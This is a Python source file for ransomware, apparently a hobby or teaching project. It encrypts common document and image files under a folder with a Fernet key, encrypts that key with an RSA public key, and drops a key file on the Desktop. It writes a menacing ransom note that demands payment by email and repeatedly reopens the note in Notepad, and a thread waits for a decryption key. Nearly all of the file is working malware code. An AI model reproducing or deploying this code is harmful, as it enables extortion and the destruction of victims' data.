# Imports
from cryptography.fernet import Fernet
import os 
import webbrowser
import ctypes
import urllib.request
import requests
import time 
import datetime 
import subprocess
import win32gui
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import base64
import threading



class RansomWare:
    fileExtensions = ['txt', 'png', 'docx', 'jpg']
 
    def __init__(self):
        self.key = None
        self.fernetEncrypter = None
        self.public_key = None
        self.sysRoot = os.path.expanduser('~')
        #self.test = r'Path to your test folder'
    
    def KeyGenerator(self): 
        self.key =  Fernet.generate_key()
        self.fernetEncrypter = Fernet(self.key)

    def RootEncrypt(self, encrypted=False):
        system = os.walk(self.test, topdown=True)
        for root, dir, files in system:
            for file in files:
                path = os.path.join(root, file)
                if not file.split('.')[-1] in self.fileExtensions:
                    continue
                if not encrypted:
                    self.FilesEncrypt(path)
                else:
                    self.FilesEncrypt(path, encrypted=True)    

    def FilesEncrypt(self, path, encrypted=False):
        with open(path, 'rb') as f:
            content = f.read()
            if not encrypted:                 
                newContent = self.fernetEncrypter.encrypt(content)
                print('File is encrpyted')
                print(newContent)
            else:
                newContent = self.fernetEncrypter.decrypt(content)
                print('File is decrpyted')
                print(newContent)
        with open(path, 'wb') as fp:
            fp.write(newContent)
     
    def WriteKeyInFile(self):
        with open('FernetKey.txt', 'wb') as f:
            f.write(self.key)
 
    def FernetKeyEncryption(self):
        with open('FernetKey.txt', 'rb') as f:
            fernetKey = f.read()
        with open('FernetKey.txt', 'wb') as f:
           
            self.public_key = RSA.import_key(open('public_key.pem').read())
            public_encrypter =  PKCS1_OAEP.new(self.public_key)
            EncryptedFernetKey = public_encrypter.encrypt(fernetKey)
            f.write(EncryptedFernetKey)
           
        with open(f'{self.sysRoot}\Desktop\SEND_ME_BACK.txt', 'wb') as f:
            f.write(EncryptedFernetKey)
           
        self.key = EncryptedFernetKey
        self.fernetEncrypter = None

    @staticmethod
    def OpenWebBrowser():
        url = 'https://www.securanceconsulting.com/wp-content/uploads/2020/07/ransomeware2.jpg'
        webbrowser.open(url)

    def RansomNote(self):
        with open('RansomNote.txt', 'w') as f:
            f.write(f'''
! ATTENTION !
Your hrddisk is being held ransom under Military Grade encryption.
Retrieval of your data is not only impossible, for you it will be improbable.
No matter what you try, this data can only be recovered if you follow the given instructions to the letter.

Follow these instructions, and we will allow you access to your data:

1. You can see a file called SEND_ME_BACK.txt at {self.sysRoot}/Desktop/SEND_ME_BACK.txt. Email it to to abc@gmail.com

2. Once payment has been completed, send another email to abc@gmail.com with only the word "PAID".
   If we sense hesitation on your part, your data will be lost forever.
   If we receive an insufficient sum, your data will be lost forever.
   If you fail to comply with these instructions, your data will be lost forever.

3. We will send you a text file containing a KEY that will unlock all your files. 
   IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after, your files will be returned to you.

WARNING:
If you attempt to decrypt your files with any software, your efforts will be futile and your data will be lost forever.
If you change file names, alter the files, or attempt decryption using software, it will cost you more to unlock your files.
Attempt anything else, there is a high chance you will lose them forever.
Do NOT send "PAID" without having completed the transaction, the cost of your data will increase for disobedience.
Do NOT assume our leniency. Wherever necessary, WE WILL delete your files altogether and throw away the key if you refuse to pay.
''')

    def OpenRansomNote(self):
        ransom = subprocess.Popen(['notepad.exe', 'RansomNote.txt'])
        count = 0
        while True:
            time.sleep(0.1)
            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if top_window == 'RansomNote - Notepad':
                pass
            else:
                time.sleep(0.1)
                ransom.kill()
                time.sleep(0.1)
                ransom = subprocess.Popen(['notepad.exe', 'RansomNote.txt'])
            time.sleep(10)
            count +=1 
            if count == 2:
                break

    def VictimSideDecryption(self):
        while True:
            try:
                print('In Process...')
                with open(f'{self.sysRoot}/Desktop/DESKTOP.txt', 'r') as f:
                    self.key = f.read()
                    self.fernetEncrypter = Fernet(self.key)
                    self.RootEncrypt(encrypted=True)
                    print('Decrypted')
                    break
            except Exception as e:
                print(e)
                pass
            time.sleep(5)
            print('Finding DESKTOP.txt file...')

def main():
    ransomware = RansomWare()
    ransomware.KeyGenerator()
    ransomware.RootEncrypt()
    ransomware.WriteKeyInFile()
    ransomware.FernetKeyEncryption()
    ransomware.OpenWebBrowser()
    time.sleep(0.1)
    ransomware.RansomNote()

    thread1 = threading.Thread(target=ransomware.OpenRansomNote)
    thread2 = threading.Thread(target=ransomware.VictimSideDecryption)

    thread1.start()
    print('All files in the test folder are encrypted')
    print('Encryption Completed')
    thread2.start()
    print('All files in the test folder are decrypted') # Debugging/Testing
    print('Decryption Completed') # Debugging/Testing

if __name__ == '__main__':
    main()
 
